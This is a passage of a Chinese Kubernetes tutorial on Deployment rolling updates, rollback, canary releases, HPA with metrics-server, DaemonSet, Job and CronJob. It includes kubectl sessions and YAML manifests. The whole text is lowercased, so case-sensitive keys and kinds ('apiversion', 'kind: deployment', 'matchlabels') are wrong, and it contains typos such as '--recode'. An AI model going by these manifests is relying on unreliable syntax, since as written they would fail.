1/1     running   0          31s\npc-deployment-5d89bdfbf9-w5nzv   1/1     running   0          31s\npc-deployment-5d89bdfbf9-xpt7w   1/1     running   0          31s\n\npc-deployment-5d89bdfbf9-xpt7w   1/1     terminating   0          41s\npc-deployment-5d89bdfbf9-65qcw   1/1     terminating   0          41s\npc-deployment-5d89bdfbf9-w5nzv   1/1     terminating   0          41s\n\npc-deployment-675d469f8b-grn8z   0/1     pending       0          0s\npc-deployment-675d469f8b-hbl4v   0/1     pending       0          0s\npc-deployment-675d469f8b-67nz2   0/1     pending       0          0s\n\npc-deployment-675d469f8b-grn8z   0/1     containercreating   0          0s\npc-deployment-675d469f8b-hbl4v   0/1     containercreating   0          0s\npc-deployment-675d469f8b-67nz2   0/1     containercreating   0          0s\n\npc-deployment-675d469f8b-grn8z   1/1     running             0          1s\npc-deployment-675d469f8b-67nz2   1/1     running             0          1s\npc-deployment-675d469f8b-hbl4v   1/1     running             0          2s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n滚动更新\n1. 编辑 pc-deployment.yaml, 在 spec 节点下添加更新策略\n\nspec:\n  strategy: # 策略\n    type: rollingupdate # 滚动更新策略\n    rollingupdate:\n      maxsurge: 25% \n      maxunavailable: 25%\n\n\n1\n2\n3\n4\n5\n6\n\n\n2. 创建 deploy 进行验证\n\n# 变更镜像\n[root@k8s-master01 ~]# kubectl set image deployment pc-deployment nginx=nginx:1.17.3 -n dev \ndeployment.apps/pc-deployment image updated\n\n# 观察升级过程\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nname                           ready   status    restarts   age\npc-deployment-c848d767-8rbzt   1/1     running   0          31m\npc-deployment-c848d767-h4p68   1/1     running   0          31m\npc-deployment-c848d767-hlmz4   1/1     running   0          31m\npc-deployment-c848d767-rrqcn   1/1     running   0          31m\n\npc-deployment-966bf7f44-226rx   0/1     pending             0          0s\npc-deployment-966bf7f44-226rx   0/1     containercreating   0          0s\npc-deployment-966bf7f44-226rx   1/1     running             0          1s\npc-deployment-c848d767-h4p68    0/1     terminating         0          34m\n\npc-deployment-966bf7f44-cnd44   0/1     pending             0          0s\npc-deployment-966bf7f44-cnd44   0/1     containercreating   0          0s\npc-deployment-966bf7f44-cnd44   1/1     running             0          2s\npc-deployment-c848d767-hlmz4    0/1     terminating         0          34m\n\npc-deployment-966bf7f44-px48p   0/1     pending             0          0s\npc-deployment-966bf7f44-px48p   0/1     containercreating   0          0s\npc-deployment-966bf7f44-px48p   1/1     running             0          0s\npc-deployment-c848d767-8rbzt    0/1     terminating         0          34m\n\npc-deployment-966bf7f44-dkmqp   0/1     pending             0          0s\npc-deployment-966bf7f44-dkmqp   0/1     containercreating   0          0s\npc-deployment-966bf7f44-dkmqp   1/1     running             0          2s\npc-deployment-c848d767-rrqcn    0/1     terminating         0          34m\n\n# 至此，新版本的pod创建完毕，就版本的pod销毁完毕\n# 中间过程是滚动进行的，也就是边销毁边创建\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n滚动更新的过程：\n\n\n\n镜像更新中 rs 的变化，可以在创建镜像得时候加 --recode 参数，有助于记录创建过程等。\n\n# 查看rs,发现原来的rs的依旧存在，只是pod数量变为了0，而后又新产生了一个rs，pod数量为4\n# 其实这就是deployment能够进行版本回退的奥妙所在，后面会详细解释\n[root@k8s-master01 ~]# kubectl get rs -n dev\nname                       desired   current   ready   age\npc-deployment-6696798b78   0         0         0       7m37s\npc-deployment-6696798b11   0         0         0       5m37s\npc-deployment-c848d76789   4         4         4       72s\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n版本回退\ndeployment 支持版本升级过程中的暂停、继续功能以及版本回退等诸多功能，下面具体来看.\n\nkubectl rollout： 版本升级相关功能，支持下面的选项：\n\n * status 显示当前升级状态\n * history 显示 升级历史记录\n * pause 暂停版本升级过程\n * resume 继续已经暂停的版本升级过程\n * restart 重启版本升级过程\n * undo 回滚到上一级版本（可以使用 --to-revision 回滚到指定版本）\n\n# 查看当前升级版本的状态\n[root@k8s-master01 ~]# kubectl rollout status deploy pc-deployment -n dev\ndeployment "pc-deployment" successfully rolled out\n\n# 查看升级历史记录\n[root@k8s-master01 ~]# kubectl rollout history deploy pc-deployment -n dev\ndeployment.apps/pc-deployment\nrevision  change-cause\n1         kubectl create --filename=pc-deployment.yaml --record=true\n2         kubectl create --filename=pc-deployment.yaml --record=true\n3         kubectl create --filename=pc-deployment.yaml --record=true\n# 可以发现有三次版本记录，说明完成过两次升级\n\n# 版本回滚\n# 这里直接使用--to-revision=1回滚到了1版本， 如果省略这个选项，就是回退到上个版本，就是2版本\n[root@k8s-master01 ~]# kubectl rollout undo deployment pc-deployment --to-revision=1 -n dev\ndeployment.apps/pc-deployment rolled back\n\n# 查看发现，通过nginx镜像版本可以发现到了第一版\n[root@k8s-master01 ~]# kubectl get deploy -n dev -o wide\nname            ready   up-to-date   available   age   containers   images         \npc-deployment   4/4     4            4           74m   nginx        nginx:1.17.1   \n\n# 查看rs，发现第一个rs中有4个pod运行，后面两个版本的rs中pod为运行\n# 其实deployment之所以可是实现版本的回滚，就是通过记录下历史rs来实现的，\n# 一旦想回滚到哪个版本，只需要将当前版本pod数量降为0，然后将回滚版本的pod提升为目标数量就可以了\n[root@k8s-master01 ~]# kubectl get rs -n dev\nname                       desired   current   ready   age\npc-deployment-6696798b78   4         4         4       78m\npc-deployment-966bf7f44    0         0         0       37m\npc-deployment-c848d767     0         0         0       71m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n金丝雀发布\ndeployment 控制器支持控制更新过程中的控制，如 “暂停 (pause)” 或 “继续 (resume)” 更新操作。\n\n比如有一批新的 pod 资源创建完成后立即暂停更新过程，此时，仅存在一部分新版本的应用，主体部分还是旧的版本。然后，再筛选一小部分的用户请求路由到新版本的 pod 应用，继续观察能否稳定地按期望的方式运行。确定没问题之后再继续完成余下的 pod 资源滚动更新，否则立即回滚更新操作。这就是所谓的金丝雀发布。\n\n# 更新deployment的版本，并配置暂停deployment\n[root@k8s-master01 ~]#  kubectl set image deploy pc-deployment nginx=nginx:1.17.4 -n dev && kubectl rollout pause deployment pc-deployment  -n dev\ndeployment.apps/pc-deployment image updated\ndeployment.apps/pc-deployment paused\n\n#观察更新状态\n[root@k8s-master01 ~]# kubectl rollout status deploy pc-deployment -n dev　\nwaiting for deployment "pc-deployment" rollout to finish: 2 out of 4 new replicas have been updated...\n\n# 监控更新的过程，可以看到已经新增了一个资源，但是并未按照预期的状态去删除一个旧的资源，就是因为使用了pause暂停命令\n\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nname                       desired   current   ready   age     containers   images         \npc-deployment-5d89bdfbf9   3         3         3       19m     nginx        nginx:1.17.1   \npc-deployment-675d469f8b   0         0         0       14m     nginx        nginx:1.17.2   \npc-deployment-6c9f56fcfb   2         2         2       3m16s   nginx        nginx:1.17.4   \n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                             ready   status    restarts   age\npc-deployment-5d89bdfbf9-rj8sq   1/1     running   0          7m33s\npc-deployment-5d89bdfbf9-ttwgg   1/1     running   0          7m35s\npc-deployment-5d89bdfbf9-v4wvc   1/1     running   0          7m34s\npc-deployment-6c9f56fcfb-996rt   1/1     running   0          3m31s\npc-deployment-6c9f56fcfb-j2gtj   1/1     running   0          3m31s\n\n# 确保更新的pod没问题了，继续更新\n[root@k8s-master01 ~]# kubectl rollout resume deploy pc-deployment -n dev\ndeployment.apps/pc-deployment resumed\n\n# 查看最后的更新情况\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nname                       desired   current   ready   age     containers   images         \npc-deployment-5d89bdfbf9   0         0         0       21m     nginx        nginx:1.17.1   \npc-deployment-675d469f8b   0         0         0       16m     nginx        nginx:1.17.2   \npc-deployment-6c9f56fcfb   4         4         4       5m11s   nginx        nginx:1.17.4   \n\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                             ready   status    restarts   age\npc-deployment-6c9f56fcfb-7bfwh   1/1     running   0          37s\npc-deployment-6c9f56fcfb-996rt   1/1     running   0          5m27s\npc-deployment-6c9f56fcfb-j2gtj   1/1     running   0          5m27s\npc-deployment-6c9f56fcfb-rf84v   1/1     running   0          37s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n删除 deployment\n\n# 删除deployment，其下的rs和pod也将被删除\n[root@k8s-master01 ~]# kubectl delete -f pc-deployment.yaml\ndeployment.apps "pc-deployment" deleted\n\n\n1\n2\n3\n\n\n\n# horizontal pod autoscaler(hpa)\n\n在前面的课程中，我们已经可以实现通过手工执行 kubectl scale 命令实现 pod 扩容或缩容，但是这显然不符合 kubernetes 的定位目标 -- 自动化、智能化。 kubernetes 期望可以实现通过监测 pod 的使用情况，实现 pod 数量的自动调整，于是就产生了 horizontal pod autoscaler（hpa）这种控制器。\n\nhpa 可以获取每个 pod 利用率，然后和 hpa 中定义的指标进行对比，同时计算出需要伸缩的具体值，最后实现 pod 的数量的调整。其实 hpa 与之前的 deployment 一样，也属于一种 kubernetes 资源对象，它通过追踪分析 rc 控制的所有目标 pod 的负载变化情况，来确定是否需要针对性地调整目标 pod 的副本数，这是 hpa 的实现原理。\n\n\n\n1 安装 metrics-server\nmetrics-server 可以用来收集集群中的资源使用情况\n\n# 安装git\n[root@k8s-master01 ~]# yum install git -y\n# 获取metrics-server, 注意使用的版本\n[root@k8s-master01 ~]# git clone -b v0.3.6 https://github.com/kubernetes-incubator/metrics-server\n# 修改deployment, 注意修改的是镜像和初始化参数\n[root@k8s-master01 ~]# cd /root/metrics-server/deploy/1.8+/\n[root@k8s-master01 1.8+]# vim metrics-server-deployment.yaml\n按图中添加下面选项\nhostnetwork: true\nimage: registry.cn-hangzhou.aliyuncs.com/google_containers/metrics-server-amd64:v0.3.6\nargs:\n- --kubelet-insecure-tls\n- --kubelet-preferred-address-types=internalip,hostname,internaldns,externaldns,externalip\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n\n# 安装metrics-server\n[root@k8s-master01 1.8+]# kubectl apply -f ./\n\n# 查看pod运行情况\n[root@k8s-master01 1.8+]# kubectl get pod -n kube-system\nmetrics-server-6b976979db-2xwbj   1/1     running   0          90s\n\n# 使用kubectl top node 查看资源使用情况\n[root@k8s-master01 1.8+]# kubectl top node\nname           cpu(cores)   cpu%   memory(bytes)   memory%\nk8s-master01   289m         14%    1582mi          54%       \nk8s-node01     81m          4%     1195mi          40%       \nk8s-node02     72m          3%     1211mi          41%  \n[root@k8s-master01 1.8+]# kubectl top pod -n kube-system\nname                              cpu(cores)   memory(bytes)\ncoredns-6955765f44-7ptsb          3m           9mi\ncoredns-6955765f44-vcwr5          3m           8mi\netcd-master                       14m          145mi\n...\n# 至此,metrics-server安装完成\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n2 准备 deployment 和 servie\n\napiversion: apps/v1\nkind: deployment\nmetadata:\n  name: nginx\n  namespace: dev\nspec:\n  strategy: # 策略\n    type: rollingupdate # 滚动更新策略\n  replicas: 1\n  selector:\n    matchlabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        resources: # 资源配额\n          limits:  # 限制资源（上限）\n            cpu: "1" # cpu限制，单位是core数\n          requests: # 请求资源（下限）\n            cpu: "100m"  # cpu限制，单位是core数\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n# 创建service\n[root@k8s-master01 1.8+]# kubectl expose deployment nginx --type=nodeport --port=80 -n dev\n\n\n1\n2\n\n\n# 查看\n[root@k8s-master01 1.8+]# kubectl get deployment,pod,svc -n dev\nname                    ready   up-to-date   available   age\ndeployment.apps/nginx   1/1     1            1           47s\n\nname                         ready   status    restarts   age\npod/nginx-7df9756ccc-bh8dr   1/1     running   0          47s\n\nname            type       cluster-ip      external-ip   port(s)        age\nservice/nginx   nodeport   10.101.18.29   <none>        80:31830/tcp   35s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n3 部署 hpa\n创建 pc-hpa.yaml 文件，内容如下：\n\napiversion: autoscaling/v1\nkind: horizontalpodautoscaler\nmetadata:\n  name: pc-hpa\n  namespace: dev\nspec:\n  minreplicas: 1  #最小pod数量\n  maxreplicas: 10 #最大pod数量\n  targetcpuutilizationpercentage: 3 # cpu使用率指标（3%）\n  scaletargetref:   # 指定要控制的nginx信息\n    apiversion: apps/v1\n    kind: deployment\n    name: nginx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 创建hpa\n[root@k8s-master01 1.8+]# kubectl create -f pc-hpa.yaml\nhorizontalpodautoscaler.autoscaling/pc-hpa created\n\n# 查看hpa\n    [root@k8s-master01 1.8+]# kubectl get hpa -n dev\nname     reference          targets   minpods   maxpods   replicas   age\npc-hpa   deployment/nginx   0%/3%     1         10        1          62s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n4 测试\n使用压测工具对 service 地址 192.168.5.4:31830 进行压测，然后通过控制台查看 hpa 和 pod 的变化\nhpa 变化\n\n[root@k8s-master01 ~]# kubectl get hpa -n dev -w\nname   reference      targets  minpods  maxpods  replicas  age\npc-hpa  deployment/nginx  0%/3%   1     10     1      4m11s\npc-hpa  deployment/nginx  0%/3%   1     10     1      5m19s\npc-hpa  deployment/nginx  22%/3%   1     10     1      6m50s\npc-hpa  deployment/nginx  22%/3%   1     10     4      7m5s\npc-hpa  deployment/nginx  22%/3%   1     10     8      7m21s\npc-hpa  deployment/nginx  6%/3%   1     10     8      7m51s\npc-hpa  deployment/nginx  0%/3%   1     10     8      9m6s\npc-hpa  deployment/nginx  0%/3%   1     10     8      13m\npc-hpa  deployment/nginx  0%/3%   1     10     1      14m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\ndeployment 变化\n\n[root@k8s-master01 ~]# kubectl get deployment -n dev -w\nname    ready   up-to-date   available   age\nnginx   1/1     1            1           11m\nnginx   1/4     1            1           13m\nnginx   1/4     1            1           13m\nnginx   1/4     1            1           13m\nnginx   1/4     4            1           13m\nnginx   1/8     4            1           14m\nnginx   1/8     4            1           14m\nnginx   1/8     4            1           14m\nnginx   1/8     8            1           14m\nnginx   2/8     8            2           14m\nnginx   3/8     8            3           14m\nnginx   4/8     8            4           14m\nnginx   5/8     8            5           14m\nnginx   6/8     8            6           14m\nnginx   7/8     8            7           14m\nnginx   8/8     8            8           15m\nnginx   8/1     8            8           20m\nnginx   8/1     8            8           20m\nnginx   1/1     1            1           20m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\npod 变化\n\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nname                     ready   status    restarts   age\nnginx-7df9756ccc-bh8dr   1/1     running   0          11m\nnginx-7df9756ccc-cpgrv   0/1     pending   0          0s\nnginx-7df9756ccc-8zhwk   0/1     pending   0          0s\nnginx-7df9756ccc-rr9bn   0/1     pending   0          0s\nnginx-7df9756ccc-cpgrv   0/1     containercreating   0          0s\nnginx-7df9756ccc-8zhwk   0/1     containercreating   0          0s\nnginx-7df9756ccc-rr9bn   0/1     containercreating   0          0s\nnginx-7df9756ccc-m9gsj   0/1     pending             0          0s\nnginx-7df9756ccc-g56qb   0/1     pending             0          0s\nnginx-7df9756ccc-sl9c6   0/1     pending             0          0s\nnginx-7df9756ccc-fgst7   0/1     pending             0          0s\nnginx-7df9756ccc-g56qb   0/1     containercreating   0          0s\nnginx-7df9756ccc-m9gsj   0/1     containercreating   0          0s\nnginx-7df9756ccc-sl9c6   0/1     containercreating   0          0s\nnginx-7df9756ccc-fgst7   0/1     containercreating   0          0s\nnginx-7df9756ccc-8zhwk   1/1     running             0          19s\nnginx-7df9756ccc-rr9bn   1/1     running             0          30s\nnginx-7df9756ccc-m9gsj   1/1     running             0          21s\nnginx-7df9756ccc-cpgrv   1/1     running             0          47s\nnginx-7df9756ccc-sl9c6   1/1     running             0          33s\nnginx-7df9756ccc-g56qb   1/1     running             0          48s\nnginx-7df9756ccc-fgst7   1/1     running             0          66s\nnginx-7df9756ccc-fgst7   1/1     terminating         0          6m50s\nnginx-7df9756ccc-8zhwk   1/1     terminating         0          7m5s\nnginx-7df9756ccc-cpgrv   1/1     terminating         0          7m5s\nnginx-7df9756ccc-g56qb   1/1     terminating         0          6m50s\nnginx-7df9756ccc-rr9bn   1/1     terminating         0          7m5s\nnginx-7df9756ccc-m9gsj   1/1     terminating         0          6m50s\nnginx-7df9756ccc-sl9c6   1/1     terminating         0          6m50s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# daemonset(ds)\n\ndaemonset 类型的控制器可以保证在集群中的每一台（或指定）节点上都运行一个副本。一般适用于日志收集、节点监控等场景。也就是说，如果一个 pod 提供的功能是节点级别的（每个节点都需要且只需要一个），那么这类 pod 就适合使用 daemonset 类型的控制器创建。\n\n\n\ndaemonset 控制器的特点：\n\n * 每当向集群中添加一个节点时，指定的 pod 副本也将添加到该节点上\n * 当节点从集群中移除时，pod 也就被垃圾回收了\n\n下面先来看下 daemonset 的资源清单文件\n\napiversion: apps/v1 # 版本号\nkind: daemonset # 类型       \nmetadata: # 元数据\n  name: # rs名称 \n  namespace: # 所属命名空间 \n  labels: #标签\n    controller: daemonset\nspec: # 详情描述\n  revisionhistorylimit: 3 # 保留历史版本\n  updatestrategy: # 更新策略\n    type: rollingupdate # 滚动更新策略\n    rollingupdate: # 滚动更新\n      maxunavailable: 1 # 最大不可用状态的 pod 的最大值，可以为百分比，也可以为整数\n  selector: # 选择器，通过它指定该控制器管理哪些pod\n    matchlabels:      # labels匹配规则\n      app: nginx-pod\n    matchexpressions: # expressions匹配规则\n      - {key: app, operator: in, values: [nginx-pod]}\n  template: # 模板，当副本数量不足时，会根据下面的模板创建pod副本\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerport: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n创建 pc-daemonset.yaml，内容如下：\n\napiversion: apps/v1\nkind: daemonset      \nmetadata:\n  name: pc-daemonset\n  namespace: dev\nspec: \n  selector:\n    matchlabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# 创建daemonset\n[root@k8s-master01 ~]# kubectl create -f  pc-daemonset.yaml\ndaemonset.apps/pc-daemonset created\n\n# 查看daemonset\n[root@k8s-master01 ~]#  kubectl get ds -n dev -o wide\nname        desired  current  ready  up-to-date  available   age   containers   images         \npc-daemonset   2        2        2      2           2        24s   nginx        nginx:1.17.1   \n\n# 查看pod,发现在每个node上都运行一个pod\n[root@k8s-master01 ~]#  kubectl get pods -n dev -o wide\nname                 ready   status    restarts   age   ip            node    \npc-daemonset-9bck8   1/1     running   0          37s   10.244.1.43   node1     \npc-daemonset-k224w   1/1     running   0          37s   10.244.2.74   node2      \n\n# 删除daemonset\n[root@k8s-master01 ~]# kubectl delete -f pc-daemonset.yaml\ndaemonset.apps "pc-daemonset" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# job\n\njob，主要用于负责 ** 批量处理 (一次要处理指定数量任务) 短暂的一次性 (每个任务仅运行一次就结束)** 任务。job 特点如下：\n\n * 当 job 创建的 pod 执行成功结束时，job 将记录成功结束的 pod 数量\n * 当成功结束的 pod 达到指定的数量时，job 将完成执行\n\n\n\njob 的资源清单文件：\n\napiversion: batch/v1 # 版本号\nkind: job # 类型       \nmetadata: # 元数据\n  name: # rs名称 \n  namespace: # 所属命名空间 \n  labels: #标签\n    controller: job\nspec: # 详情描述\n  completions: 1 # 指定job需要成功运行pods的次数。默认值: 1\n  parallelism: 1 # 指定job在任一时刻应该并发运行pods的数量。默认值: 1\n  activedeadlineseconds: 30 # 指定job可运行的时间期限，超过时间还未结束，系统将会尝试进行终止。\n  backofflimit: 6 # 指定job失败后进行重试的次数。默认是6\n  manualselector: true # 是否可以使用selector选择器选择pod，默认是false\n  selector: # 选择器，通过它指定该控制器管理哪些pod\n    matchlabels:      # labels匹配规则\n      app: counter-pod\n    matchexpressions: # expressions匹配规则\n      - {key: app, operator: in, values: [counter-pod]}\n  template: # 模板，当副本数量不足时，会根据下面的模板创建pod副本\n    metadata:\n      labels:\n        app: counter-pod\n    spec:\n      restartpolicy: never # 重启策略只能设置为never或者onfailure\n      containers:\n      - name: counter\n        image: busybox:1.30\n        command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 2;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n> 关于重启策略设置的说明：\n> 如果指定为 onfailure，则 job 会在 pod 出现故障时重启容器，而不是创建 pod，failed 次数不变\n> 如果指定为 never，则 job 会在 pod 出现故障时创建新的 pod，并且故障 pod 不会消失，也不会重启，failed 次数加 1\n> 如果指定为 always 的话，就意味着一直重启，意味着 job 任务会重复去执行了，当然不对，所以不能设置为 always\n\n创建 pc-job.yaml，内容如下：\n\napiversion: batch/v1\nkind: job      \nmetadata:\n  name: pc-job\n  namespace: dev\nspec:\n  manualselector: true\n  selector:\n    matchlabels:\n      app: counter-pod\n  template:\n    metadata:\n      labels:\n        app: counter-pod\n    spec:\n      restartpolicy: never\n      containers:\n      - name: counter\n        image: busybox:1.30\n        command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 3;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# 创建job\n[root@k8s-master01 ~]# kubectl create -f pc-job.yaml\njob.batch/pc-job created\n\n# 查看job\n[root@k8s-master01 ~]# kubectl get job -n dev -o wide  -w\nname     completions   duration   age   containers   images         selector\npc-job   0/1           21s        21s   counter      busybox:1.30   app=counter-pod\npc-job   1/1           31s        79s   counter      busybox:1.30   app=counter-pod\n\n# 通过观察pod状态可以看到，pod在运行完毕任务后，就会变成completed状态\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nname           ready   status     restarts      age\npc-job-rxg96   1/1     running     0            29s\npc-job-rxg96   0/1     completed   0            33s\n\n# 接下来，调整下pod运行的总数量和并行数量 即：在spec下设置下面两个选项\n#  completions: 6 # 指定job需要成功运行pods的次数为6\n#  parallelism: 3 # 指定job并发运行pods的数量为3\n#  然后重新运行job，观察效果，此时会发现，job会每次运行3个pod，总共执行了6个pod\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nname           ready   status    restarts   age\npc-job-684ft   1/1     running   0          5s\npc-job-jhj49   1/1     running   0          5s\npc-job-pfcvh   1/1     running   0          5s\npc-job-684ft   0/1     completed   0          11s\npc-job-v7rhr   0/1     pending     0          0s\npc-job-v7rhr   0/1     pending     0          0s\npc-job-v7rhr   0/1     containercreating   0          0s\npc-job-jhj49   0/1     completed           0          11s\npc-job-fhwf7   0/1     pending             0          0s\npc-job-fhwf7   0/1     pending             0          0s\npc-job-pfcvh   0/1     completed           0          11s\npc-job-5vg2j   0/1     pending             0          0s\npc-job-fhwf7   0/1     containercreating   0          0s\npc-job-5vg2j   0/1     pending             0          0s\npc-job-5vg2j   0/1     containercreating   0          0s\npc-job-fhwf7   1/1     running             0          2s\npc-job-v7rhr   1/1     running             0          2s\npc-job-5vg2j   1/1     running             0          3s\npc-job-fhwf7   0/1     completed           0          12s\npc-job-v7rhr   0/1     completed           0          12s\npc-job-5vg2j   0/1     completed           0          12s\n\n# 删除job\n[root@k8s-master01 ~]# kubectl delete -f pc-job.yaml\njob.batch "pc-job" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n\n# cronjob(cj)\n\ncronjob 控制器以 job 控制器资源为其管控对象，并借助它管理 pod 资源对象，job 控制器定义的作业任务在其控制器资源创建之后便会立即执行，但 cronjob 可以以类似于 linux 操作系统的周期性任务作业计划的方式控制其运行时间点及重复运行的方式。也就是说，cronjob 可以在特定的时间点 (反复的) 去运行 job 任务。\n\n\n\ncronjob 的资源清单文件：\n\napiversion: batch/v1beta1 # 版本号\nkind: cronjob # 类型       \nmetadata: # 元数据\n  name: # rs名称 \n  namespace: # 所属命名空间 \n  labels: #标签\n    controller: cronjob\nspec: # 详情描述\n  schedule: # cron格式的作业调度运行时间点,用于控制任务在什么时间执行\n  concurrencypolicy: # 并发执行策略，用于定义前一次作业运行尚未完成时是否以及如何运行后一次的作业\n  failedjobhistorylimit: # 为失败的任务执行保留的历史记录数，默认为1\n  successfuljobhistorylimit: # 为成功的任务执行保留的历史记录数，默认为3\n  startingdeadlineseconds: # 启动作业错误的超时时长\n  jobtemplate: # job控制器模板，用于为cronjob控制器生成job对象;下面其实就是job的定义\n    metadata:\n    spec:\n      completions: 1\n      parallelism: 1\n      activedeadlineseconds: 30\n      backofflimit: 6\n      manualselector: true\n      selector:\n        matchlabels:\n          app: counter-pod\n        matchexpressions: 规则\n          - {key: app, operator: in, values: [counter-pod]}\n      template:\n        metadata:\n          labels:\n            app: counter-pod\n        spec:\n          restartpolicy: never \n          containers:\n          - name: counter\n            image: busybox:1.30\n            command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 20;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n需要重点解释的几个选项：\nschedule: cron表达式，用于指定任务的执行时间\n    */1    *      *    *     *\n    <分钟> <小时> <日> <月份> <星期>\n\n    分钟 值从 0 到 59.\n    小时 值从 0 到 23.\n    日 值从 1 到 31.\n    月 值从 1 到 12.\n    星期 值从 0 到 6, 0 代表星期日\n    多个时间可以用逗号隔开； 范围可以用连字符给出；*可以作为通配符； /表示每...\nconcurrencypolicy: 比如a任务1分钟运行一次，可是a任务本次运行了超过1分钟，那么是否允许让下个周期的任务运行？\n    allow:   允许jobs并发运行(默认)\n    forbid:  禁止并发运行，如果上一次运行尚未完成，则跳过下一次运行\n    replace: 替换，取消当前正在运行的作业并用新作业替换它\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n创建 pc-cronjob.yaml，内容如下：\n\napiversion: batch/v1beta1\nkind: cronjob\nmetadata:\n  name: pc-cronjob\n  namespace: dev\n  labels:\n    controller: cronjob\nspec:\n  schedule: "*/1 * * * *"\n  jobtemplate:\n    metadata:\n    spec:\n      template:\n        spec:\n          restartpolicy: never\n          containers:\n          - name: counter\n            image: busybox:1.30\n            command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 3;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n# 创建cronjob\n[root@k8s-master01 ~]# kubectl create -f pc-cronjob.yaml\ncronjob.batch/pc-cronjob created\n\n# 查看cronjob\n[root@k8s-master01 ~]# kubectl get cronjobs -n dev\nname         schedule      suspend   active   last schedule   age\npc-cronjob   */1 * * * *   false     0        <none>          6s\n\n# 查看job\n[root@k8s-master01 ~]# kubectl get jobs -n dev\nname                    completions   duration   age\npc-cronjob-1592587800   1/1           28s        3m26s\npc-cronjob-1592587860   1/1           28s        2m26s\npc-cronjob-1592587920   1/1           28s        86s\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods -n dev\npc-cronjob-1592587800-x4tsm   0/1     completed   0          2m24s\npc-cronjob-1592587860-r5gv4   0/1     completed   0          84s\npc-cronjob-1592587920-9dxxq   1/1     running     0          24s\n\n\n# 删除cronjob\n[root@k8s-master01 ~]# kubectl  delete -f pc-cronjob.yaml\ncronjob.batch "pc-cronjob" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n',charsets:{cjk:!0}},{title:"kubernetes(十) 